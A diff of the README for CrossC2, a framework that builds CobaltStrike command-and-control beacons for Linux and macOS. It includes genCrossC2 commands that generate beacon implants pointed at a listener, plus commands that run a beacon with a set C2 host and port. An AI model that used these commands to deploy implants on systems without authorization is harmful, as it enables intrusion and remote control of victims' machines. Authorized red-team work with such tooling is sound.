@@ -1,7 +1,7 @@
 # CrossC2 framework
 
-[![ Linux ](https://svgshare.com/i/Zhy.svg)](https://svgshare.com/i/Zhy.svg)
-[![ macOS ](https://svgshare.com/i/ZjP.svg)](https://svgshare.com/i/ZjP.svg)
+![ Linux ](https://img.shields.io/badge/platform-Linux-green)
+![ macOS ](https://img.shields.io/badge/platform-macOS-green)
 [![GitHub issues-closed](https://img.shields.io/github/issues-closed/gloxec/CrossC2.svg)](https://GitHub.com/gloxec/CrossC2/issues?q=is%3Aissue+is%3Aclosed)
 [![Release](https://img.shields.io/github/release/gloxec/CrossC2.svg)](https://github.com/gloxec/CrossC2/releases/latest)
 [![Downloads](https://img.shields.io/github/downloads/gloxec/CrossC2/total?label=Release%20Download)](https://github.com/gloxec/CrossC2/releases/latest)
@@ -20,7 +20,7 @@
 
 Support CobaltStrike's security assessment of other platforms (Linux/MacOS/...), and include the development support of Unix post-penetration module
 
-|                 | CS3.14(bug fixes) | CS4.0 | CS4.X (>=4.1) |
+|                 | CS3.14(bug fixes) | CS4.0 | CS4.X (4.1~4.8) |
 |-----------------|----------|-------|---------------|
 | Master branch        | ✅        |       |               |
 | cs4.0 branch         |          | ✅     |               |
@@ -28,6 +28,8 @@ Support CobaltStrike's security assessment of other platforms (Linux/MacOS/...),
 |                 |          |       |               |
 | Release Page <= v2.1 | ✅        |       |               |
 | Release Page >= v2.2 |          |       | ✅             |
+
+![2023-07-31 16.56.51](media/16292585578533/CrossC2_action.gif)
 
 # Usage
 
@@ -49,17 +51,22 @@ Download **CrossC2.cna** **genCrossC2** **CrossC2Kit**, modify `CrossC2.cna` con
 
 Use the GUI function provided by cli or cna to generate beacon by default
 
-* When teamserver is configured with c2profile, the rebind library needs to be generated in advance for use when generating beacon
-* When using the forwarding method, in addition to specifying the rebind library, you also need to pay attention to the C2_HOST field when generating:
-    * When the service provider uses the HTTP request content to verify the type, it needs to specify the CDN IP list: `genCrossC2 1.1.1.1,2.2.2.2,3.3.3.3,xxx.xxx.xxx.xx ...`
-    * When the CDN server is verified by SNI, CDN operators such as Cloudflare need to specify the domain name bound to the CDN: `genCrossC2 c2.domain.com ...`
+`genCrossC2 <listener-ip/domain> <listener-port> <beacon_keys> <rebind_library;config.ini;c2profile.profile> <target_platform> <target_arch>`
+    
+ex:
 
-Rebind library related introduction: 
-* [📖wiki](https://gloxec.github.io/CrossC2/zh_cn/protocol/)
-* Demo: 
-    * C2Profile demo [📄demo_c2profile.profile](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile) [📄demo_c2profil_rebind.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c) 
-    * UDP communication demo [📄demo_udp_proxy_server.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py) [📄demo_udp_rebind.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c)
-* Issues: [🏷issue #65 (Example of data transfer and c2profile field correspondence)](https://github.com/gloxec/CrossC2/issues/65)、[🏷issue #89 (Data processing example)](https://github.com/gloxec/CrossC2/issues/89#issuecomment-861194022)
+```
+1. read BEACON_KEY from current path and generate BEACON of default C2Profile traffic protocol
+    genCrossC2 127.0.0.1 5555 null null Linux x64 beacon.out
+     
+2. specify the BEACON of the custom protocol dynamic library
+    genCrossC2 127.0.0.1 5555 .cobaltstrike.beacon_keys c2profile.so MacOS x64 beacon.out
+
+3. specify the C2Profile that needs to be automatically parsed
+    genCrossC2 www.example.com 443 .cobaltstrike.beacon_keys ";;c2profile.profile" Linux x64 beacon.out
+```
+
+more advanced configuration can be found in the documentation: [📄Reference](https://github.com/gloxec/CrossC2/wiki/genCrossC2)
 
 > 5. Run beacon
 
@@ -69,6 +76,20 @@ Rebind library related introduction:
 * Temporarily specify the protocol library for beacon and run: `/tmp/c2 /tmp/c2-rebind.so`
 * Temporarily set C2 configuration for beacon: `export CCHOST=127.0.0.1 && export CCPORT=443 && /tmp/c2`
 * Set DEBUG to view the online status of beacon: `export CCDEBUG=1 && /tmp/c2`
+
+# CrossC2Kit
+
+CrossC2Kit: https://github.com/CrossC2/CrossC2Kit
+
+CrossC2Kit is an infiltration expansion around the Unix platform derived from CrossC2. Use **Aggressor Script** Open Source Script engine. It can be used to create automation to simulate the operation process of the Red Team and expand the **CobaltStrike** client.
+
+**CrossC2Kit** is inherited from the original features of **CobaltStrike**, so the development and writing grammar still refer to the official documentation: https://trial.cobaltstrike.com/aggressor-script/index.html
+
+But it has some API extensions on top of CrossC2 to control the **beacon** of the Unix platform
+
+API: [📄Reference](https://github.com/CrossC2/CrossC2Kit/wiki/API-Reference)
+
+Demo: ![CrossC2_action2](media/16292585578533/CrossC2_action2.gif)
 
 # Note
 
